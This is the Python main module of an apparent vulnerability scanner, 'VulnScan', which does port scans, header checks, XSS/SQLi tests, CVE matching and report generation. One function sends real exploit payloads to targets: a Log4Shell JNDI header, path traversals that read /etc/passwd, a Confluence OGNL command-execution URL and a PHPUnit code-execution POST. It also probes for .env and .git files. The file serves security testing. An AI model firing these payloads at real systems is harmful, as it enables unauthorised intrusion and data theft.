#!/usr/bin/env python3
"""
VulnScan - Comprehensive Vulnerability Scanner
Main module integrating all scanning capabilities
Inspired by Nuclei, Subfinder, XSStrike, and other security tools
"""

import os
import sys
import json
import time
import argparse
import concurrent.futures
from datetime import datetime
from typing import List, Dict, Optional, Set
from dataclasses import dataclass, field, asdict
from enum import Enum

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

# Disable SSL warnings for scanning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Import our modules
from target_parser import TargetParser, Target, TargetType
from port_scanner import PortScanner, ServiceInfo, PortState
from xss_scanner import XSSScanner, XSSVulnerability, XSSType
from sqli_scanner import SQLiScanner, SQLiVulnerability, SQLiType
from cve_database import CVEMatcher, CVEEntry, Severity, VulnCategory
from exploit_engine import ExploitEngine, ToolCommandGenerator, GeneratedExploit


class ScanType(Enum):
    QUICK = "quick"
    FULL = "full"
    PORTS = "ports"
    WEB = "web"
    CVE = "cve"
    ALL = "all"


@dataclass
class ScanConfig:
    """Scan configuration"""
    scan_type: ScanType = ScanType.QUICK
    threads: int = 10
    timeout: int = 10
    user_agent: str = "VulnScan/1.0"
    proxy: Optional[str] = None
    verify_ssl: bool = False
    follow_redirects: bool = True
    max_depth: int = 2
    port_scan: bool = True
    xss_scan: bool = True
    sqli_scan: bool = True
    cve_scan: bool = True
    subdomain_scan: bool = False
    output_file: Optional[str] = None
    output_format: str = "text"  # text, json, html
    verbose: bool = False


@dataclass
class Vulnerability:
    """Generic vulnerability finding"""
    vuln_type: str
    severity: str
    title: str
    description: str
    target: str
    evidence: str
    confidence: int
    cve_id: Optional[str] = None
    poc_commands: List[str] = field(default_factory=list)
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class ScanResult:
    """Complete scan result for a target"""
    target: str
    scan_start: str
    scan_end: str
    status: str
    ports: Dict[int, dict] = field(default_factory=dict)
    services: List[dict] = field(default_factory=list)
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    technologies: List[str] = field(default_factory=list)
    headers: Dict[str, str] = field(default_factory=dict)
    certificates: Dict = field(default_factory=dict)
    metadata: Dict = field(default_factory=dict)


class VulnScanner:
    """Main vulnerability scanner class"""

    BANNER = """
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗ ██████╗ █████╗   ║
║   ██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔════╝██╔══██╗  ║
║   ██║   ██║██║   ██║██║     ██╔██╗ ██║███████╗██║     ███████║  ║
║   ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║╚════██║██║     ██╔══██║  ║
║    ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║███████║╚██████╗██║  ██║  ║
║     ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝  ║
║                                                                  ║
║        Comprehensive Vulnerability Scanner v1.0                  ║
║        Port Scan | XSS | SQLi | CVE Detection | PoC Gen         ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
"""

    def __init__(self, config: ScanConfig = None):
        self.config = config or ScanConfig()
        self.target_parser = TargetParser(resolve_dns=True)
        self.cve_matcher = CVEMatcher()
        self.exploit_engine = ExploitEngine()
        self.session = self._create_session()
        self.results: List[ScanResult] = []
        self.total_vulns = 0

    def _create_session(self) -> requests.Session:
        """Create HTTP session with retry logic"""
        session = requests.Session()
        retry = Retry(total=1, backoff_factor=0.3, status_forcelist=[502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update({
            "User-Agent": self.config.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        })
        if self.config.proxy:
            session.proxies = {"http": self.config.proxy, "https": self.config.proxy}
        return session

    def print_banner(self):
        """Print the banner"""
        print(self.BANNER)

    def scan(self, targets: List[str]) -> List[ScanResult]:
        """Scan multiple targets"""
        self.results = []
        self.total_vulns = 0

        # Parse targets
        parsed_targets = []
        for target_str in targets:
            if os.path.isfile(target_str):
                parsed_targets.extend(self.target_parser.parse_file(target_str))
            else:
                parsed_targets.append(self.target_parser.parse(target_str))

        # Expand CIDR and ranges
        if any(t.target_type in [TargetType.CIDR, TargetType.IP_RANGE] for t in parsed_targets):
            parsed_targets = self.target_parser.expand_targets()

        print(f"\n[*] Scanning {len(parsed_targets)} target(s)...")

        # Scan each target
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = {executor.submit(self._scan_target, target): target for target in parsed_targets}

            for future in concurrent.futures.as_completed(futures):
                target = futures[future]
                try:
                    result = future.result()
                    self.results.append(result)
                    self._print_target_summary(result)
                except Exception as e:
                    print(f"[-] Error scanning {target.value}: {str(e)}")

        return self.results

    def _scan_target(self, target: Target) -> ScanResult:
        """Scan a single target"""
        scan_start = datetime.now().isoformat()

        result = ScanResult(
            target=target.get_url() if target.target_type == TargetType.URL else target.value,
            scan_start=scan_start,
            scan_end="",
            status="scanning"
        )

        try:
            # Port scanning
            if self.config.port_scan and target.target_type in [TargetType.IP, TargetType.DOMAIN, TargetType.SUBDOMAIN, TargetType.HOSTNAME]:
                self._scan_ports(target, result)

            # Get HTTP headers and detect technologies
            if target.target_type == TargetType.URL or target.port in [80, 443, 8080, 8443]:
                self._scan_http(target, result)

            # CVE scanning based on detected services
            if self.config.cve_scan:
                self._scan_cves(target, result)

            # XSS scanning
            if self.config.xss_scan and self._is_web_target(target):
                self._scan_xss(target, result)

            # SQLi scanning
            if self.config.sqli_scan and self._is_web_target(target):
                self._scan_sqli(target, result)

            result.status = "completed"

        except Exception as e:
            result.status = f"error: {str(e)}"

        result.scan_end = datetime.now().isoformat()
        return result

    def _scan_ports(self, target: Target, result: ScanResult):
        """Perform port scanning"""
        if self.config.verbose:
            print(f"[*] Port scanning {target.value}...")

        scanner = PortScanner(timeout=self.config.timeout, max_threads=self.config.threads)

        host = target.resolved_ip or target.value

        if self.config.scan_type == ScanType.QUICK:
            ports = scanner.quick_scan(host)
        elif self.config.scan_type == ScanType.FULL:
            ports = scanner.full_scan(host)
        else:
            ports = scanner.quick_scan(host)

        for port, info in ports.items():
            if info.state == PortState.OPEN:
                result.ports[port] = {
                    "state": info.state.value,
                    "service": info.service_name,
                    "product": info.product,
                    "version": info.version,
                    "ssl": info.ssl,
                    "banner": info.banner[:200] if info.banner else ""
                }
                result.services.append({
                    "port": port,
                    "service": info.service_name,
                    "product": info.product,
                    "version": info.version
                })

                # Add detected product to technologies
                if info.product:
                    result.technologies.append(f"{info.product} {info.version}".strip())

    def _scan_http(self, target: Target, result: ScanResult):
        """Scan HTTP service"""
        if self.config.verbose:
            print(f"[*] HTTP scanning {target.get_url()}...")

        try:
            url = target.get_url()
            response = self.session.get(
                url,
                timeout=self.config.timeout,
                verify=self.config.verify_ssl,
                allow_redirects=self.config.follow_redirects
            )

            # Capture headers
            result.headers = dict(response.headers)

            # Detect technologies from headers
            self._detect_technologies(response, result)

            # Check for common vulnerabilities
            self._check_http_vulns(response, target, result)

            # Check for sensitive files
            self._check_sensitive_files(target, result)

        except requests.exceptions.RequestException as e:
            if self.config.verbose:
                print(f"[-] HTTP error: {str(e)}")

    def _detect_technologies(self, response: requests.Response, result: ScanResult):
        """Detect technologies from HTTP response"""
        headers = response.headers

        # Server header
        if "Server" in headers:
            result.technologies.append(headers["Server"])

        # X-Powered-By
        if "X-Powered-By" in headers:
            result.technologies.append(headers["X-Powered-By"])

        # Check response content for technology signatures
        content = response.text.lower()

        tech_signatures = {
            "wordpress": ["wp-content", "wp-includes", "wordpress"],
            "drupal": ["drupal", "sites/default"],
            "joomla": ["joomla", "/media/jui/"],
            "django": ["csrfmiddlewaretoken", "django"],
            "laravel": ["laravel_session", "laravel"],
            "rails": ["rails", "_rails"],
            "express": ["express", "x-powered-by: express"],
            "spring": ["springframework", "spring"],
            "angular": ["ng-app", "angular"],
            "react": ["react", "_react"],
            "vue": ["vue", "__vue__"],
            "jquery": ["jquery"],
            "bootstrap": ["bootstrap"],
        }

        for tech, signatures in tech_signatures.items():
            for sig in signatures:
                if sig in content:
                    if tech.capitalize() not in result.technologies:
                        result.technologies.append(tech.capitalize())
                    break

    def _check_http_vulns(self, response: requests.Response, target: Target, result: ScanResult):
        """Check for common HTTP vulnerabilities"""
        headers = response.headers

        # Missing security headers
        security_headers = {
            "X-Frame-Options": "Missing X-Frame-Options header - Clickjacking risk",
            "X-Content-Type-Options": "Missing X-Content-Type-Options header - MIME sniffing risk",
            "X-XSS-Protection": "Missing X-XSS-Protection header",
            "Strict-Transport-Security": "Missing HSTS header",
            "Content-Security-Policy": "Missing Content-Security-Policy header",
        }

        for header, description in security_headers.items():
            if header not in headers:
                result.vulnerabilities.append(Vulnerability(
                    vuln_type="MISCONFIG",
                    severity="LOW",
                    title=f"Missing Security Header: {header}",
                    description=description,
                    target=target.get_url(),
                    evidence=f"Header '{header}' not present in response",
                    confidence=100,
                    remediation=f"Add the {header} header to HTTP responses"
                ))

        # Server version disclosure
        if "Server" in headers:
            server = headers["Server"]
            if any(c.isdigit() for c in server):
                result.vulnerabilities.append(Vulnerability(
                    vuln_type="INFO_DISCLOSURE",
                    severity="LOW",
                    title="Server Version Disclosure",
                    description=f"Server version exposed: {server}",
                    target=target.get_url(),
                    evidence=f"Server header: {server}",
                    confidence=100,
                    remediation="Configure web server to hide version information"
                ))

        # CORS misconfiguration
        if "Access-Control-Allow-Origin" in headers:
            origin = headers["Access-Control-Allow-Origin"]
            if origin == "*":
                allow_creds = headers.get("Access-Control-Allow-Credentials", "").lower() == "true"
                severity = "HIGH" if allow_creds else "MEDIUM"
                result.vulnerabilities.append(Vulnerability(
                    vuln_type="CORS",
                    severity=severity,
                    title="CORS Misconfiguration",
                    description="Access-Control-Allow-Origin set to wildcard",
                    target=target.get_url(),
                    evidence=f"ACAO: {origin}, Credentials: {allow_creds}",
                    confidence=95 if allow_creds else 80,
                    remediation="Restrict CORS to specific trusted origins"
                ))

    def _check_sensitive_files(self, target: Target, result: ScanResult):
        """Check for sensitive files"""
        sensitive_paths = [
            ("/.git/config", "Git configuration exposed"),
            ("/.env", "Environment file exposed"),
            ("/.svn/entries", "SVN metadata exposed"),
            ("/phpinfo.php", "PHP info page accessible"),
            ("/server-status", "Apache server status accessible"),
            ("/elmah.axd", "ELMAH error log accessible"),
            ("/.DS_Store", "Mac DS_Store file exposed"),
            ("/web.config", "ASP.NET configuration exposed"),
            ("/crossdomain.xml", "Flash crossdomain policy"),
            ("/robots.txt", "Robots.txt file"),
            ("/.well-known/security.txt", "Security.txt file"),
        ]

        base_url = target.get_base_url()

        for path, description in sensitive_paths:
            try:
                url = base_url + path
                response = self.session.get(url, timeout=5, verify=False, allow_redirects=False)

                if response.status_code == 200 and len(response.text) > 10:
                    # Determine severity based on file type
                    severity = "HIGH" if path in ["/.git/config", "/.env", "/web.config"] else "MEDIUM"

                    result.vulnerabilities.append(Vulnerability(
                        vuln_type="INFO_DISCLOSURE",
                        severity=severity,
                        title=f"Sensitive File Exposed: {path}",
                        description=description,
                        target=url,
                        evidence=f"HTTP {response.status_code}, Length: {len(response.text)}",
                        confidence=90,
                        poc_commands=[f"curl -s '{url}'"],
                        remediation=f"Remove or restrict access to {path}"
                    ))

            except Exception:
                pass

    def _scan_cves(self, target: Target, result: ScanResult):
        """Scan for known CVEs based on detected services"""
        if self.config.verbose:
            print(f"[*] CVE scanning {target.value}...")

        # Build banner string from detected technologies
        banner = " ".join(result.technologies)
        for service in result.services:
            banner += f" {service.get('product', '')} {service.get('version', '')}"

        # Match against CVE database
        matched_cves = self.cve_matcher.match_banner(banner)

        for cve in matched_cves:
            # Generate PoC commands
            exploit = self.exploit_engine.get_exploit_for_cve(cve.cve_id, target.get_url())

            vuln = Vulnerability(
                vuln_type=cve.category.value,
                severity=cve.severity.value,
                title=cve.title,
                description=cve.description,
                target=target.get_url() if target.target_type == TargetType.URL else target.value,
                evidence=f"Matched pattern in: {banner[:100]}",
                confidence=70,
                cve_id=cve.cve_id,
                poc_commands=exploit.commands if exploit else cve.poc_commands,
                remediation=cve.remediation,
                references=cve.references
            )
            result.vulnerabilities.append(vuln)

        # Check for specific CVE paths
        self._check_cve_paths(target, result)

    def _check_cve_paths(self, target: Target, result: ScanResult):
        """Check for CVE-specific vulnerable paths"""
        if not self._is_web_target(target):
            return

        # Critical CVE paths to check
        cve_paths = [
            # Log4Shell
            ("/", "CVE-2021-44228", {"X-Api-Version": "${jndi:ldap://test/a}"}, "Log4Shell"),
            # Apache path traversal
            ("/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "CVE-2021-41773", {}, "Apache Path Traversal"),
            ("/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "CVE-2021-41773", {}, "Apache Path Traversal"),
            # Grafana
            ("/public/plugins/alertlist/../../../../../../../../etc/passwd", "CVE-2021-43798", {}, "Grafana LFI"),
            # FortiOS
            ("/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession", "CVE-2018-13379", {}, "FortiOS Path Traversal"),
            # Confluence
            ("/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%2C%27utf-8%27%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%27X-Cmd-Response%27%2C%23a%29%29%7D/", "CVE-2022-26134", {}, "Confluence OGNL Injection"),
            # PHPUnit
            ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "CVE-2017-9841", {}, "PHPUnit RCE"),
        ]

        base_url = target.get_base_url()

        for path, cve_id, headers, description in cve_paths:
            try:
                url = base_url + path
                response = self.session.get(
                    url,
                    headers=headers,
                    timeout=5,
                    verify=False,
                    allow_redirects=False
                )

                # Check for indicators of vulnerability
                vulnerable = False
                evidence = ""

                if "root:" in response.text or "uid=" in response.text:
                    vulnerable = True
                    evidence = "File contents exposed"
                elif response.status_code == 200 and cve_id == "CVE-2017-9841":
                    if "<?php" not in response.text:  # PHPUnit eval
                        # Try POST with PHP code
                        test_response = self.session.post(
                            url,
                            data="<?php echo md5('vulnscan_test'); ?>",
                            timeout=5,
                            verify=False
                        )
                        if "3c4e51a8" in test_response.text:  # md5('vulnscan_test')[:8]
                            vulnerable = True
                            evidence = "PHP code execution confirmed"

                if vulnerable:
                    cve_entry = self.cve_matcher.find_by_cve_id(cve_id)
                    result.vulnerabilities.append(Vulnerability(
                        vuln_type="RCE" if "RCE" in description else "PATH_TRAVERSAL",
                        severity="CRITICAL",
                        title=f"{description} ({cve_id})",
                        description=cve_entry.description if cve_entry else description,
                        target=url,
                        evidence=evidence,
                        confidence=95,
                        cve_id=cve_id,
                        poc_commands=[f"curl -s '{url}'"],
                        remediation=cve_entry.remediation if cve_entry else "Update to latest version"
                    ))

            except Exception:
                pass

    def _scan_xss(self, target: Target, result: ScanResult):
        """Scan for XSS vulnerabilities"""
        if self.config.verbose:
            print(f"[*] XSS scanning {target.get_url()}...")

        scanner = XSSScanner(
            timeout=self.config.timeout,
            user_agent=self.config.user_agent,
            proxy=self.config.proxy
        )

        try:
            xss_vulns = scanner.scan_url(target.get_url())

            for xss in xss_vulns:
                result.vulnerabilities.append(Vulnerability(
                    vuln_type="XSS",
                    severity="HIGH" if xss.xss_type == XSSType.REFLECTED else "MEDIUM",
                    title=f"{xss.xss_type.value} in parameter '{xss.parameter}'",
                    description=f"XSS vulnerability found in {xss.context.value} context",
                    target=xss.url,
                    evidence=xss.evidence,
                    confidence=xss.confidence,
                    poc_commands=[f"curl -s '{xss.poc_url}'" if xss.poc_url else ""],
                    remediation="Implement input validation and output encoding"
                ))

        except Exception as e:
            if self.config.verbose:
                print(f"[-] XSS scan error: {str(e)}")

    def _scan_sqli(self, target: Target, result: ScanResult):
        """Scan for SQL injection vulnerabilities"""
        if self.config.verbose:
            print(f"[*] SQLi scanning {target.get_url()}...")

        scanner = SQLiScanner(
            timeout=self.config.timeout,
            user_agent=self.config.user_agent,
            proxy=self.config.proxy
        )

        try:
            sqli_vulns = scanner.scan_url(target.get_url())

            for sqli in sqli_vulns:
                result.vulnerabilities.append(Vulnerability(
                    vuln_type="SQLi",
                    severity="CRITICAL",
                    title=f"{sqli.sqli_type.value} in parameter '{sqli.parameter}'",
                    description=f"SQL injection vulnerability detected ({sqli.db_type.value})",
                    target=sqli.url,
                    evidence=sqli.evidence,
                    confidence=sqli.confidence,
                    poc_commands=sqli.poc_commands,
                    remediation="Use parameterized queries/prepared statements"
                ))

        except Exception as e:
            if self.config.verbose:
                print(f"[-] SQLi scan error: {str(e)}")

    def _is_web_target(self, target: Target) -> bool:
        """Check if target is a web target"""
        return (
            target.target_type == TargetType.URL or
            target.port in [80, 443, 8080, 8443] or
            target.protocol in ["http", "https"]
        )

    def _print_target_summary(self, result: ScanResult):
        """Print summary for a scanned target"""
        print(f"\n{'='*60}")
        print(f"Target: {result.target}")
        print(f"{'='*60}")

        if result.ports:
            print(f"\n[+] Open Ports: {len(result.ports)}")
            for port, info in sorted(result.ports.items()):
                service = info.get('service', 'unknown')
                product = info.get('product', '')
                version = info.get('version', '')
                print(f"    {port}/tcp  {service}  {product} {version}")

        if result.technologies:
            print(f"\n[+] Technologies: {', '.join(set(result.technologies))}")

        if result.vulnerabilities:
            self.total_vulns += len(result.vulnerabilities)
            print(f"\n[!] Vulnerabilities Found: {len(result.vulnerabilities)}")

            # Group by severity
            by_severity = {}
            for vuln in result.vulnerabilities:
                sev = vuln.severity
                if sev not in by_severity:
                    by_severity[sev] = []
                by_severity[sev].append(vuln)

            for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
                if severity in by_severity:
                    print(f"\n  [{severity}]")
                    for vuln in by_severity[severity]:
                        cve_str = f" ({vuln.cve_id})" if vuln.cve_id else ""
                        print(f"    - {vuln.title}{cve_str}")
                        if self.config.verbose and vuln.poc_commands:
                            print(f"      PoC: {vuln.poc_commands[0][:80]}...")

        print(f"\nStatus: {result.status}")

    def generate_report(self, format: str = "text") -> str:
        """Generate scan report"""
        if format == "json":
            return self._generate_json_report()
        elif format == "html":
            return self._generate_html_report()
        else:
            return self._generate_text_report()

    def _generate_text_report(self) -> str:
        """Generate text report"""
        report = []
        report.append("=" * 70)
        report.append("VULNERABILITY SCAN REPORT")
        report.append("=" * 70)
        report.append(f"Generated: {datetime.now().isoformat()}")
        report.append(f"Total Targets: {len(self.results)}")
        report.append(f"Total Vulnerabilities: {self.total_vulns}")
        report.append("")

        # Summary
        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        for result in self.results:
            for vuln in result.vulnerabilities:
                if vuln.severity in severity_counts:
                    severity_counts[vuln.severity] += 1

        report.append("Severity Summary:")
        for sev, count in severity_counts.items():
            report.append(f"  {sev}: {count}")

        # Detailed findings
        for result in self.results:
            report.append("")
            report.append("=" * 70)
            report.append(f"TARGET: {result.target}")
            report.append("=" * 70)

            if result.ports:
                report.append("\nOpen Ports:")
                for port, info in sorted(result.ports.items()):
                    report.append(f"  {port}/tcp - {info.get('service')} - {info.get('product')} {info.get('version')}")

            if result.technologies:
                report.append(f"\nTechnologies: {', '.join(set(result.technologies))}")

            if result.vulnerabilities:
                report.append(f"\nVulnerabilities ({len(result.vulnerabilities)}):")
                for i, vuln in enumerate(result.vulnerabilities, 1):
                    report.append(f"\n  [{i}] {vuln.title}")
                    report.append(f"      Type: {vuln.vuln_type}")
                    report.append(f"      Severity: {vuln.severity}")
                    report.append(f"      Confidence: {vuln.confidence}%")
                    if vuln.cve_id:
                        report.append(f"      CVE: {vuln.cve_id}")
                    report.append(f"      Evidence: {vuln.evidence[:100]}")
                    if vuln.poc_commands:
                        report.append(f"      PoC: {vuln.poc_commands[0]}")
                    report.append(f"      Remediation: {vuln.remediation}")

        return "\n".join(report)

    def _generate_json_report(self) -> str:
        """Generate JSON report"""
        report = {
            "scan_info": {
                "generated": datetime.now().isoformat(),
                "total_targets": len(self.results),
                "total_vulnerabilities": self.total_vulns
            },
            "results": []
        }

        for result in self.results:
            result_dict = {
                "target": result.target,
                "scan_start": result.scan_start,
                "scan_end": result.scan_end,
                "status": result.status,
                "ports": result.ports,
                "technologies": list(set(result.technologies)),
                "vulnerabilities": [asdict(v) for v in result.vulnerabilities]
            }
            report["results"].append(result_dict)

        return json.dumps(report, indent=2)

    def _generate_html_report(self) -> str:
        """Generate HTML report"""
        html = """<!DOCTYPE html>
<html>
<head>
    <title>VulnScan Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a2e; color: #eee; }
        h1 { color: #00ff88; }
        h2 { color: #00bfff; border-bottom: 1px solid #00bfff; padding-bottom: 5px; }
        .target { background: #16213e; padding: 15px; margin: 15px 0; border-radius: 8px; }
        .vuln { background: #0f3460; padding: 10px; margin: 10px 0; border-radius: 5px; border-left: 4px solid; }
        .critical { border-color: #ff0000; }
        .high { border-color: #ff6600; }
        .medium { border-color: #ffcc00; }
        .low { border-color: #00ff00; }
        .tag { display: inline-block; padding: 2px 8px; border-radius: 3px; margin: 2px; font-size: 12px; }
        .tag-critical { background: #ff0000; }
        .tag-high { background: #ff6600; }
        .tag-medium { background: #ffcc00; color: #000; }
        .tag-low { background: #00ff00; color: #000; }
        pre { background: #0a0a1a; padding: 10px; border-radius: 5px; overflow-x: auto; }
        code { color: #00ff88; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #16213e; }
    </style>
</head>
<body>
    <h1>VulnScan Report</h1>
    <p>Generated: """ + datetime.now().isoformat() + """</p>
    <p>Total Targets: """ + str(len(self.results)) + """ | Total Vulnerabilities: """ + str(self.total_vulns) + """</p>
"""

        for result in self.results:
            html += f"""
    <div class="target">
        <h2>{result.target}</h2>
        <p>Status: {result.status} | Scan Time: {result.scan_start}</p>
"""
            if result.ports:
                html += "<h3>Open Ports</h3><table><tr><th>Port</th><th>Service</th><th>Product</th><th>Version</th></tr>"
                for port, info in sorted(result.ports.items()):
                    html += f"<tr><td>{port}</td><td>{info.get('service', '')}</td><td>{info.get('product', '')}</td><td>{info.get('version', '')}</td></tr>"
                html += "</table>"

            if result.technologies:
                html += f"<h3>Technologies</h3><p>{', '.join(set(result.technologies))}</p>"

            if result.vulnerabilities:
                html += f"<h3>Vulnerabilities ({len(result.vulnerabilities)})</h3>"
                for vuln in result.vulnerabilities:
                    sev_class = vuln.severity.lower()
                    html += f"""
        <div class="vuln {sev_class}">
            <strong>{vuln.title}</strong>
            <span class="tag tag-{sev_class}">{vuln.severity}</span>
            <p>{vuln.description}</p>
            <p><strong>Evidence:</strong> {vuln.evidence}</p>
            <p><strong>Confidence:</strong> {vuln.confidence}%</p>
"""
                    if vuln.cve_id:
                        html += f"<p><strong>CVE:</strong> {vuln.cve_id}</p>"
                    if vuln.poc_commands:
                        html += f"<p><strong>PoC:</strong></p><pre><code>{vuln.poc_commands[0]}</code></pre>"
                    html += f"<p><strong>Remediation:</strong> {vuln.remediation}</p></div>"

            html += "</div>"

        html += "</body></html>"
        return html

    def save_report(self, filename: str, format: str = None):
        """Save report to file"""
        if format is None:
            ext = os.path.splitext(filename)[1].lower()
            format = "json" if ext == ".json" else "html" if ext in [".html", ".htm"] else "text"

        report = self.generate_report(format)

        with open(filename, 'w') as f:
            f.write(report)

        print(f"\n[+] Report saved to: {filename}")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="VulnScan - Comprehensive Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  vulnscan.py -u http://example.com
  vulnscan.py -u 192.168.1.1 --ports
  vulnscan.py -f targets.txt --full
  vulnscan.py -u http://example.com/page?id=1 --sqli --xss
  vulnscan.py -u example.com -o report.html
        """
    )

    # Target options
    target_group = parser.add_argument_group("Target")
    target_group.add_argument("-u", "--url", help="Target URL, IP, or domain")
    target_group.add_argument("-f", "--file", help="File containing targets")
    target_group.add_argument("-l", "--list", nargs="+", help="List of targets")

    # Scan options
    scan_group = parser.add_argument_group("Scan Options")
    scan_group.add_argument("--quick", action="store_true", help="Quick scan (default)")
    scan_group.add_argument("--full", action="store_true", help="Full comprehensive scan")
    scan_group.add_argument("--ports", action="store_true", help="Port scan only")
    scan_group.add_argument("--web", action="store_true", help="Web vulnerability scan only")
    scan_group.add_argument("--cve", action="store_true", help="CVE detection only")

    # Module options
    module_group = parser.add_argument_group("Modules")
    module_group.add_argument("--xss", action="store_true", help="Enable XSS scanning")
    module_group.add_argument("--sqli", action="store_true", help="Enable SQLi scanning")
    module_group.add_argument("--no-ports", action="store_true", help="Disable port scanning")
    module_group.add_argument("--no-cve", action="store_true", help="Disable CVE scanning")

    # Performance options
    perf_group = parser.add_argument_group("Performance")
    perf_group.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    perf_group.add_argument("--timeout", type=int, default=10, help="Timeout in seconds (default: 10)")

    # Output options
    output_group = parser.add_argument_group("Output")
    output_group.add_argument("-o", "--output", help="Output file for report")
    output_group.add_argument("--format", choices=["text", "json", "html"], default="text", help="Output format")
    output_group.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    output_group.add_argument("--no-banner", action="store_true", help="Don't show banner")

    # Network options
    net_group = parser.add_argument_group("Network")
    net_group.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    net_group.add_argument("--user-agent", default="VulnScan/1.0", help="Custom User-Agent")

    args = parser.parse_args()

    # Validate targets
    targets = []
    if args.url:
        targets.append(args.url)
    if args.file:
        targets.append(args.file)
    if args.list:
        targets.extend(args.list)

    if not targets:
        parser.print_help()
        print("\n[-] Error: No targets specified")
        sys.exit(1)

    # Determine scan type
    scan_type = ScanType.QUICK
    if args.full:
        scan_type = ScanType.FULL
    elif args.ports:
        scan_type = ScanType.PORTS
    elif args.web:
        scan_type = ScanType.WEB
    elif args.cve:
        scan_type = ScanType.CVE

    # Build config
    config = ScanConfig(
        scan_type=scan_type,
        threads=args.threads,
        timeout=args.timeout,
        user_agent=args.user_agent,
        proxy=args.proxy,
        port_scan=not args.no_ports,
        xss_scan=args.xss or scan_type in [ScanType.FULL, ScanType.WEB],
        sqli_scan=args.sqli or scan_type in [ScanType.FULL, ScanType.WEB],
        cve_scan=not args.no_cve,
        output_file=args.output,
        output_format=args.format,
        verbose=args.verbose
    )

    # Create scanner and run
    scanner = VulnScanner(config)

    if not args.no_banner:
        scanner.print_banner()

    try:
        scanner.scan(targets)

        # Generate and save report
        if args.output:
            scanner.save_report(args.output, args.format)
        else:
            print("\n" + scanner.generate_report(args.format))

        # Print summary
        print(f"\n{'='*60}")
        print("SCAN COMPLETE")
        print(f"{'='*60}")
        print(f"Targets scanned: {len(scanner.results)}")
        print(f"Vulnerabilities found: {scanner.total_vulns}")

    except KeyboardInterrupt:
        print("\n[-] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Error: {str(e)}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
